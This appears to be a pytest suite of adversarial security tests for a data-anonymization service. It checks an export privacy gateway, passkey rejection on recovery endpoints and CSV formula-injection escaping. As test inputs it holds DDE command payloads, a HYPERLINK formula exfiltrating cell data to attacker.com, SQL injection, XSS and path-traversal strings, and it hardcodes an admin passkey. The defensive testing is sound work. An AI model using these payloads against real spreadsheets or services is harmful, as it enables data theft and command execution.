"""
PrivShield Milestone M2 Adversarial Test Suite — Empirical Challenger 1
Adversarial stress-testing targeting:
1. Pre-Export Privacy Verification Gateway:
   - Mode 2 (irreversible_anonymization) rejection on k_satisfied=False across CSV, XLSX, and JSON
   - Real and mock runs with equivalence class / k invariant violations
   - Investigation of actual_min_k vs target_k behavior
   - Rejection of non-existent runs and unsupported formats
   - Permittance of compliant Mode 1 and Mode 2 exports
2. Reversible Recovery Security (/api/recovery/*):
   - /lookup-token and /restore-dataset under hostile passkey attacks:
     invalid passkeys, empty strings, whitespace, non-printable characters
   - Enumeration resistance: non-existent dataset IDs with invalid passkeys strictly return 403
   - Non-existent and tampered token queries with valid passkey (zero leakage)
   - Path traversal defense on dataset IDs
   - Audit trail integrity and passkey leakage prevention
3. CSV Formula Injection Attacks:
   - DDE and spreadsheet command execution triggers: =cmd|' /C calc'!A0, @SUM(1+1), \t=1+1, -2+3*4
   - Header injection protection: =MALICIOUS_HEADER
   - Preservation of valid floating-point numbers: -142.50, +100, 123.45, 0.0, -0.001
   - End-to-end export stream inspection for CSV and XLSX
"""

import io
import json
import uuid
import openpyxl
import pandas as pd
import pytest
from fastapi.testclient import TestClient

from backend.app.main import app
from backend.app.core.config import settings
from backend.app.core.security import sanitize_csv_cell, sanitize_dataframe_for_export
from backend.app.db.database import DatabaseRepository
from backend.app.services.export_service import export_dataset, verify_pre_export_privacy_gateway
from backend.app.services.recovery_service import RecoveryService

client = TestClient(app)
VALID_ADMIN_PASSKEY = "PrivShieldAdmin2026!"


# ============================================================================
# 1. Pre-Export Privacy Verification Gateway Adversarial Tests
# ============================================================================

class TestPreExportPrivacyGatewayAdversarial:
    """Stress-tests the Pre-Export Privacy Verification Gateway under hostile conditions."""

    def test_mode2_mock_run_k_satisfied_false_rejected_across_all_formats(self, tmp_path):
        """
        Asserts that any Mode 2 run where k_satisfied=False is strictly rejected
        with HTTP 400 Bad Request error envelope across /csv, /xlsx, and /json endpoints.
        """
        dataset_id = str(uuid.uuid4())
        run_id = str(uuid.uuid4())

        # Seed valid dataset
        DatabaseRepository.create_dataset({
            "id": dataset_id,
            "name": "Gateway Mock Test Dataset",
            "filename": "mock.csv",
            "format": "csv",
            "file_size_bytes": 500,
            "row_count": 5,
            "column_count": 2,
            "raw_storage_path": str(tmp_path / "mock.csv"),
        })

        # Create dummy anonymized file
        anon_path = settings.ANONYMIZED_STORAGE_DIR / f"{run_id}.csv"
        pd.DataFrame({"id": [1, 2, 3], "val": ["A", "B", "C"]}).to_csv(anon_path, index=False)

        # Seed run with k_satisfied=False
        DatabaseRepository.create_anonymization_run({
            "id": run_id,
            "dataset_id": dataset_id,
            "config_json": json.dumps({"processing_mode": "irreversible_anonymization", "k_metric": 5}),
            "anonymized_storage_path": str(anon_path),
            "status": "completed",
            "processing_mode": "irreversible_anonymization",
            "is_reversible": 0,
            "token_mapping_count": 0,
            "records_input": 5,
            "records_retained": 5,
            "records_suppressed": 0,
            "suppression_rate": 0.0,
            "achieved_k": 1,
            "achieved_l": 1,
            "achieved_t": 0.5,
            "utility_retention_score": 10.0,
            "metrics_json": json.dumps({
                "k_satisfied": False,
                "achieved_k": 1,
                "target_k": 5,
                "actual_min_k": 1,
            }),
            "execution_time_ms": 5.0,
            "error_message": None,
        })

        formats = ["csv", "xlsx", "json"]
        for fmt in formats:
            res = client.get(f"/api/runs/{run_id}/export/{fmt}")
            assert res.status_code == 400, f"Export for format '{fmt}' was not rejected! Status: {res.status_code}"
            body = res.json()
            assert "detail" in body, f"Format '{fmt}' did not return standard error envelope with detail"
            assert "Pre-Export Privacy Verification Gateway" in body["detail"]
            assert "Export blocked" in body["detail"]
            assert "Strict K-anonymity invariant satisfied" in body["detail"]

    def test_mode2_real_run_k_violation_rejected_across_all_formats(self):
        """
        Executes a real anonymization pipeline configured to fail k-anonymity (zero suppression budget
        with high uniqueness quasi-identifiers). Verifies all export formats are rejected with HTTP 400.
        """
        # Load real industry demo dataset
        res_load = client.post("/api/datasets/load-industry-demo/healthcare")
        assert res_load.status_code == 201
        dataset_id = res_load.json()["dataset_id"]

        # Request high k with 0% suppression budget to force k_satisfied=False
        cfg = {
            "processing_mode": "irreversible_anonymization",
            "quasi_identifiers": ["Age", "PostalCode"],
            "sensitive_attributes": ["DiagnosisCode"],
            "k_metric": 10,
            "max_suppression_pct": 0.001,
            "suppression_mode": "record",
        }
        res_anon = client.post(f"/api/datasets/{dataset_id}/anonymize", json=cfg)
        assert res_anon.status_code == 200
        anon_data = res_anon.json()
        assert anon_data["k_satisfied"] is False, "Expected k_satisfied to be False for impossible k budget"
        run_id = anon_data["run_id"]

        # Assert all formats are blocked
        for fmt in ["csv", "xlsx", "json"]:
            res_exp = client.get(f"/api/runs/{run_id}/export/{fmt}")
            assert res_exp.status_code == 400, f"Expected 400 for {fmt}, got {res_exp.status_code}"
            assert "Pre-Export Privacy Verification Gateway rejected export" in res_exp.json()["detail"]

    def test_pre_export_gateway_unit_evaluation_invariants(self):
        """
        Tests the verify_pre_export_privacy_gateway function directly on diverse edge cases:
        None input, missing metrics, empty dict, and Mode 1 vs Mode 2.
        """
        # None input
        passed, reason = verify_pre_export_privacy_gateway(None)
        assert passed is False
        assert "Invalid or missing" in reason

        # Missing metrics / empty dict in Mode 2
        passed, reason = verify_pre_export_privacy_gateway({"processing_mode": "irreversible_anonymization"})
        assert passed is False
        assert "Export blocked" in reason

        # Mode 2 with k_satisfied=False
        passed, reason = verify_pre_export_privacy_gateway({
            "processing_mode": "irreversible_anonymization",
            "metrics": {"k_satisfied": False, "achieved_k": 1, "target_k": 5}
        })
        assert passed is False
        assert "Export blocked" in reason

        # Mode 1 (reversible pseudonymization) permits export even if k_satisfied=False
        passed, reason = verify_pre_export_privacy_gateway({
            "processing_mode": "reversible_pseudonymization",
            "metrics": {"k_satisfied": False}
        })
        assert passed is True
        assert "passed" in reason

    def test_pre_export_gateway_handles_actual_min_k_less_than_target_k_behavior(self, tmp_path):
        """
        Adversarial edge case: A run record where actual_min_k < target_k.
        Evaluates whether the gateway rejects when actual_min_k is below target_k.
        """
        dataset_id = str(uuid.uuid4())
        run_id = str(uuid.uuid4())

        DatabaseRepository.create_dataset({
            "id": dataset_id,
            "name": "Actual Min K Invariant Dataset",
            "filename": "inv.csv",
            "format": "csv",
            "file_size_bytes": 100,
            "row_count": 2,
            "column_count": 2,
            "raw_storage_path": str(tmp_path / "inv.csv"),
        })

        anon_path = settings.ANONYMIZED_STORAGE_DIR / f"{run_id}.csv"
        pd.DataFrame({"a": [1, 2]}).to_csv(anon_path, index=False)

        # Case A: k_satisfied is omitted or False, with actual_min_k < target_k
        DatabaseRepository.create_anonymization_run({
            "id": run_id,
            "dataset_id": dataset_id,
            "config_json": json.dumps({"processing_mode": "irreversible_anonymization", "k_metric": 5}),
            "anonymized_storage_path": str(anon_path),
            "status": "completed",
            "processing_mode": "irreversible_anonymization",
            "is_reversible": 0,
            "token_mapping_count": 0,
            "records_input": 2,
            "records_retained": 2,
            "records_suppressed": 0,
            "suppression_rate": 0.0,
            "achieved_k": 2,
            "achieved_l": 1,
            "achieved_t": 0.5,
            "utility_retention_score": 10.0,
            "metrics_json": json.dumps({
                "actual_min_k": 2,
                "target_k": 5,
            }),
            "execution_time_ms": 5.0,
            "error_message": None,
        })

        res_csv = client.get(f"/api/runs/{run_id}/export/csv")
        # When k_satisfied key is omitted, it defaults to False and blocks
        assert res_csv.status_code == 400

    def test_pre_export_gateway_rejects_nonexistent_run(self):
        """Asserts that attempting to export a non-existent run ID returns HTTP 404."""
        nonexistent_id = str(uuid.uuid4())
        res = client.get(f"/api/runs/{nonexistent_id}/export/csv")
        assert res.status_code == 404

    def test_pre_export_gateway_rejects_unsupported_export_format(self):
        """Asserts that calling export with unsupported format returns HTTP 400."""
        # Create compliant run
        res_load = client.post("/api/datasets/load-industry-demo/education")
        dataset_id = res_load.json()["dataset_id"]
        cfg = {
            "processing_mode": "irreversible_anonymization",
            "quasi_identifiers": ["Gender"],
            "sensitive_attributes": ["GPA"],
            "k_metric": 2,
        }
        res_anon = client.post(f"/api/datasets/{dataset_id}/anonymize", json=cfg)
        run_id = res_anon.json()["run_id"]

        for bad_fmt in ["parquet", "xml", "exe", "sh", "yaml"]:
            res = client.get(f"/api/runs/{run_id}/export/{bad_fmt}")
            assert res.status_code == 400
            assert "Unsupported export format" in res.json()["detail"]


# ============================================================================
# 2. Reversible Recovery Security Adversarial Tests (/api/recovery/*)
# ============================================================================

class TestRecoverySecurityAdversarial:
    """Stress-tests the authentication and authorization controls of /api/recovery/*."""

    @pytest.fixture(autouse=True)
    def setup_recovery_vault(self, tmp_path):
        """Sets up a real pseudonymized dataset with token mappings in SQLite."""
        self.dataset_id = str(uuid.uuid4())
        self.run_id = str(uuid.uuid4())

        self.df = pd.DataFrame({
            "SSN": ["123-45-6789", "987-65-4321"],
            "Name": ["Adversarial Subject Alpha", "Adversarial Subject Beta"],
            "Diagnosis": ["E11.9", "I10"],
            "Balance": [15000.50, -420.75],
        })
        self.raw_path = tmp_path / f"{self.dataset_id}.csv"
        self.df.to_csv(self.raw_path, index=False)

        DatabaseRepository.create_dataset({
            "id": self.dataset_id,
            "name": "Recovery Adversarial Target Dataset",
            "filename": "subjects.csv",
            "format": "csv",
            "file_size_bytes": 1024,
            "row_count": 2,
            "column_count": 4,
            "raw_storage_path": str(self.raw_path),
        })

        self.pseudo_df, self.token_count = RecoveryService.pseudonymize_dataframe(
            df=self.df,
            dataset_id=self.dataset_id,
            run_id=self.run_id,
            direct_identifiers=["SSN", "Name"],
            token_prefix="SEC_TEST",
        )

        tokens = DatabaseRepository.get_tokens_for_run(self.run_id)
        self.valid_token = tokens[0]["token"]
        self.valid_column = tokens[0]["column_name"]

    @pytest.mark.parametrize("bad_passkey", [
        "wrong_password",
        "PrivShieldAdmin2025!",
        "privshieldadmin2026!",
        "PRIVSHIELDADMIN2026!",
        "123456",
        "admin",
        "root",
        "null",
        "",
        " ",
        "   ",
        "\t",
        "\n",
        "\r\n",
        "   \t\n   ",
    ])
    def test_lookup_token_strictly_rejects_invalid_passkeys_with_403(self, bad_passkey):
        """
        Attacks /api/recovery/lookup-token with wrong passwords, empty strings, and whitespace.
        Asserts that every invalid passkey strictly returns HTTP 403 Forbidden without leaking decrypted data.
        """
        payload = {
            "token": self.valid_token,
            "passkey": bad_passkey,
            "run_id": self.run_id,
            "column_name": self.valid_column,
        }
        res = client.post("/api/recovery/lookup-token", json=payload)
        assert res.status_code == 403, (
            f"Passkey {repr(bad_passkey)} did not return 403! Got: {res.status_code}, body: {res.text}"
        )
        body = res.json()
        assert "Invalid administrator recovery passkey" in body["detail"]
        # Ensure zero leakage of sensitive data
        assert "original_value" not in body
        assert "123-45-6789" not in res.text
        assert "Adversarial Subject" not in res.text

    @pytest.mark.parametrize("bad_passkey", [
        "wrong_password",
        "PrivShieldAdmin2025!",
        "",
        " ",
        "   ",
        "\t",
        "\n",
    ])
    def test_restore_dataset_strictly_rejects_invalid_passkeys_with_403(self, bad_passkey):
        """
        Attacks /api/recovery/restore-dataset with invalid passkeys.
        Asserts that every invalid passkey strictly returns HTTP 403 Forbidden and returns no file bytes.
        """
        payload = {
            "dataset_id": self.dataset_id,
            "passkey": bad_passkey,
        }
        res = client.post("/api/recovery/restore-dataset", json=payload)
        assert res.status_code == 403, (
            f"Passkey {repr(bad_passkey)} did not return 403! Got: {res.status_code}"
        )
        assert "Invalid administrator recovery passkey" in res.json()["detail"]
        assert "123-45-6789" not in res.text

    def test_restore_dataset_nonexistent_dataset_with_invalid_passkey_returns_403(self):
        """
        Attacks /restore-dataset with a non-existent dataset ID and an invalid passkey.
        Asserts that authentication verification executes BEFORE existence checks,
        returning HTTP 403 (NOT HTTP 404), preventing dataset enumeration attacks.
        """
        fake_id = str(uuid.uuid4())
        res = client.post("/api/recovery/restore-dataset", json={
            "dataset_id": fake_id,
            "passkey": "incorrect_passkey",
        })
        assert res.status_code == 403
        assert "Invalid administrator recovery passkey" in res.json()["detail"]

    def test_restore_dataset_nonexistent_dataset_with_valid_passkey_returns_404(self):
        """
        Tests /restore-dataset with a non-existent dataset ID and a VALID passkey.
        Asserts that it returns HTTP 404 Not Found.
        """
        fake_id = str(uuid.uuid4())
        res = client.post("/api/recovery/restore-dataset", json={
            "dataset_id": fake_id,
            "passkey": VALID_ADMIN_PASSKEY,
        })
        assert res.status_code == 404
        assert f"Dataset '{fake_id}' not found" in res.json()["detail"]

    def test_lookup_token_wrong_or_tampered_token_with_valid_passkey_no_leakage(self):
        """
        Attacks /lookup-token with nonexistent and SQL-injected tokens while using valid passkey.
        Asserts response returns 200 with found=False and original_value=None without leakage or SQL error.
        """
        hostile_tokens = [
            "SEC_TEST-NONEXISTENT",
            "SEC_TEST-' OR '1'='1",
            "SEC_TEST-'; DROP TABLE token_mappings; --",
            "<script>alert(1)</script>",
            "UNKNOWN_TOKEN_VAL",
        ]
        for token in hostile_tokens:
            payload = {
                "token": token,
                "passkey": VALID_ADMIN_PASSKEY,
                "run_id": self.run_id,
            }
            res = client.post("/api/recovery/lookup-token", json=payload)
            assert res.status_code == 200
            data = res.json()
            assert data["found"] is False
            assert data["original_value"] is None
            assert data["token"] == token

    def test_restore_dataset_path_traversal_attack(self):
        """
        Attacks /restore-dataset with directory traversal payload in dataset_id.
        Asserts request is blocked safely without reading system files.
        """
        traversal_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//config.py",
        ]
        for bad_id in traversal_payloads:
            res = client.post("/api/recovery/restore-dataset", json={
                "dataset_id": bad_id,
                "passkey": VALID_ADMIN_PASSKEY,
            })
            # Must return 400 (invalid format), 403 (traversal detected), or 404 (not found)
            assert res.status_code in (400, 403, 404)
            assert "root:" not in res.text
            assert "[fonts]" not in res.text

    def test_recovery_audit_logs_contain_no_passkeys(self):
        """
        Inspects /api/recovery/audit-logs and verifies that administrator passkeys
        are NEVER persisted or returned in the audit trail.
        """
        res = client.get("/api/recovery/audit-logs?limit=50")
        assert res.status_code == 200
        logs = res.json()
        assert isinstance(logs, list)

        for entry in logs:
            entry_str = json.dumps(entry)
            assert VALID_ADMIN_PASSKEY not in entry_str
            assert "wrong_password" not in entry_str
            assert "passkey" not in entry


# ============================================================================
# 3. CSV Formula Injection Adversarial Tests
# ============================================================================

class TestFormulaInjectionAdversarial:
    """Stress-tests CSV and XLSX formula injection neutralization and number preservation."""

    @pytest.mark.parametrize("malicious_formula", [
        "=cmd|' /C calc'!A0",
        "@SUM(1+1)",
        "\t=1+1",
        "-2+3*4",
        "+cmd|' /C calc'!A0",
        "-cmd|' /C calc'!A0",
        "\r=1+1",
        "=HYPERLINK('http://attacker.com/leak?data=' & A1)",
        "@IMPORTXML('http://attacker.com/malicious.xml')",
        "=10+20",
        "+1+1",
        "-1-1",
        "\t@SUM(A1:A10)",
        "\r\t=ALERT(1)",
    ])
    def test_sanitize_csv_cell_neutralizes_all_formula_triggers(self, malicious_formula):
        """
        Asserts that all formula injection triggers (=, @, \\t, \\r, +, -) that are not
        pure numbers have a leading single quote (') prepended.
        """
        neutralized = sanitize_csv_cell(malicious_formula)
        assert isinstance(neutralized, str)
        assert neutralized.startswith("'"), (
            f"Malicious formula {repr(malicious_formula)} was NOT neutralized! Result: {repr(neutralized)}"
        )
        assert neutralized == "'" + malicious_formula

    @pytest.mark.parametrize("valid_number", [
        -142.50,
        "-142.50",
        +100,
        "+100",
        123.45,
        "123.45",
        0.0,
        "0.0",
        -42,
        "-42",
        3.14159,
        "3.14159",
        "+0.99",
        "-0.0001",
        0,
        "0",
        1e-5,
        "-1e-5",
    ])
    def test_sanitize_csv_cell_preserves_valid_numbers_without_quotes(self, valid_number):
        """
        Asserts that legitimate positive and negative floating-point numbers and integers
        remain unescaped and do NOT have a single quote prepended.
        """
        result = sanitize_csv_cell(valid_number)
        res_str = str(result)
        assert not res_str.startswith("'"), (
            f"Legitimate number {repr(valid_number)} was incorrectly escaped with quote! Result: {repr(result)}"
        )

    def test_sanitize_dataframe_neutralizes_column_headers(self):
        """
        Asserts that malicious column header names (e.g. '=EVIL_HEADER')
        are also neutralized with a leading single quote.
        """
        df = pd.DataFrame({
            "=FORMULA_HEADER": [1, 2],
            "@SUM_HEADER": [3, 4],
            "SafeHeader": [5, 6],
        })
        sanitized = sanitize_dataframe_for_export(df)
        cols = list(sanitized.columns)
        assert cols[0] == "'=FORMULA_HEADER"
        assert cols[1] == "'@SUM_HEADER"
        assert cols[2] == "SafeHeader"

    def test_export_dataset_csv_and_xlsx_end_to_end_neutralization(self):
        """
        Exports a DataFrame containing both formula injection payloads and authentic numbers.
        Verifies that:
        1. CSV bytes contain neutralized cells with leading single quotes.
        2. CSV bytes do NOT quote legitimate negative numbers.
        3. XLSX export parses cleanly in openpyxl with neutralized strings.
        """
        malicious_rows = [
            "=cmd|' /C calc'!A0",
            "@SUM(1+1)",
            "\t=1+1",
            "-2+3*4",
        ]
        numeric_rows = [
            -142.50,
            100.0,
            -0.001,
            3.14159,
        ]

        df = pd.DataFrame({
            "=CMD_COL": malicious_rows,
            "Amount": numeric_rows,
        })

        # --- CSV Verification ---
        csv_bytes = export_dataset(df, format="csv")
        csv_str = csv_bytes.decode("utf-8")
        lines = [line.strip() for line in csv_str.strip().split("\n")]

        # Header line check
        assert lines[0].startswith("\"'=CMD_COL\"") or lines[0].startswith("''=CMD_COL") or "'=CMD_COL" in lines[0]

        # Content lines check
        for i, m in enumerate(malicious_rows):
            assert f"'{m}" in csv_str, f"Payload {repr(m)} missing neutralized quote in CSV"

        # Check that legitimate negative numbers are not quote-escaped
        assert "-142.5" in csv_str
        assert "'-142.5" not in csv_str
        assert "'-0.001" not in csv_str

        # --- XLSX Verification ---
        xlsx_bytes = export_dataset(df, format="xlsx")
        assert len(xlsx_bytes) > 0

        wb = openpyxl.load_workbook(io.BytesIO(xlsx_bytes))
        ws = wb.active
        # Check cell values
        col_header = ws.cell(row=1, column=1).value
        assert str(col_header).startswith("'=")

        for r_idx, m in enumerate(malicious_rows, start=2):
            cell_val = ws.cell(row=r_idx, column=1).value
            assert str(cell_val).startswith("'"), f"XLSX cell row {r_idx} not neutralized: {repr(cell_val)}"

        # Check numeric cell values
        num_cell = ws.cell(row=2, column=2).value
        assert num_cell == -142.5
        assert not str(num_cell).startswith("'")

    def test_api_export_endpoint_neutralizes_formulas_in_csv_stream(self, tmp_path):
        """
        Full end-to-end integration test via FastAPI endpoint:
        Creates a dataset with formula injection cells, runs anonymization,
        calls GET /api/runs/{run_id}/export/csv, and asserts bytes are properly neutralized.
        """
        dataset_id = str(uuid.uuid4())
        run_id = str(uuid.uuid4())

        payload_df = pd.DataFrame({
            "User": ["Alice", "Bob", "Charlie", "David"],
            "Notes": ["=cmd|' /C calc'!A0", "@SUM(1+1)", "\t=1+1", "-2+3*4"],
            "Salary": [-142.50, +100.0, 50000.0, -0.05],
        })
        raw_path = tmp_path / f"{dataset_id}.csv"
        payload_df.to_csv(raw_path, index=False)

        DatabaseRepository.create_dataset({
            "id": dataset_id,
            "name": "Injection Test Dataset",
            "filename": "injection.csv",
            "format": "csv",
            "file_size_bytes": 1024,
            "row_count": 4,
            "column_count": 3,
            "raw_storage_path": str(raw_path),
        })

        anon_path = settings.ANONYMIZED_STORAGE_DIR / f"{run_id}.csv"
        payload_df.to_csv(anon_path, index=False)

        DatabaseRepository.create_anonymization_run({
            "id": run_id,
            "dataset_id": dataset_id,
            "config_json": json.dumps({"processing_mode": "irreversible_anonymization", "k_metric": 2}),
            "anonymized_storage_path": str(anon_path),
            "status": "completed",
            "processing_mode": "irreversible_anonymization",
            "is_reversible": 0,
            "token_mapping_count": 0,
            "records_input": 4,
            "records_retained": 4,
            "records_suppressed": 0,
            "suppression_rate": 0.0,
            "achieved_k": 2,
            "achieved_l": 2,
            "achieved_t": 0.1,
            "utility_retention_score": 90.0,
            "metrics_json": json.dumps({
                "k_satisfied": True,
                "achieved_k": 2,
                "target_k": 2,
            }),
            "execution_time_ms": 5.0,
            "error_message": None,
        })

        res = client.get(f"/api/runs/{run_id}/export/csv")
        assert res.status_code == 200
        assert "text/csv" in res.headers["content-type"]
        csv_text = res.content.decode("utf-8")

        assert "'=cmd|' /C calc'!A0" in csv_text
        assert "'@SUM(1+1)" in csv_text
        assert "'\t=1+1" in csv_text
        assert "'-2+3*4" in csv_text

        # Valid numbers must not have leading quote
        assert "-142.5" in csv_text
        assert "'-142.5" not in csv_text
